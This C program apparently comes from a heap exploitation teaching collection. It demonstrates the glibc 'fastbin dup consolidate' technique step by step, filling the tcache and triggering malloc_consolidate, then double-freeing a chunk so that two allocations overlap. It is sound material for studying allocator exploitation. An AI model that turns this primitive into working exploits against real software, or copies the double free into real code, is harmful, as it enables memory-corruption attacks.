#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

void main() {
	// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8
	puts("This is a powerful technique that bypasses the double free check in tcachebin.");
	printf("Fill up the tcache list to force the fastbin usage...\n");

	void *ptr[7];

	for(int i = 0; i < 7; i++)
		ptr[i] = malloc(0x40);
	for(int i = 0; i < 7; i++)
		free(ptr[i]);

	void* p1 = calloc(1,0x40);

	printf("Allocate another chunk of the same size p1=%p \n", p1);
  	printf("Freeing p1 will add this chunk to the fastbin list...\n\n");
  	free(p1);

  	void* p3 = malloc(0x400);
	printf("Allocating a tcache-sized chunk (p3=%p)\n", p3);
	printf("will trigger the malloc_consolidate and merge\n");
	printf("the fastbin chunks into the top chunk, thus\n");
	printf("p1 and p3 are now pointing to the same chunk !\n\n");

	assert(p1 == p3);

  	printf("Triggering the double free vulnerability!\n\n");
	free(p1);

	void *p4 = malloc(0x400);

	assert(p4 == p3);

	printf("The double free added the chunk referenced by p1 \n");
	printf("to the tcache thus the next similar-size malloc will\n");
	printf("point to p3: p3=%p, p4=%p\n\n",p3, p4);
}
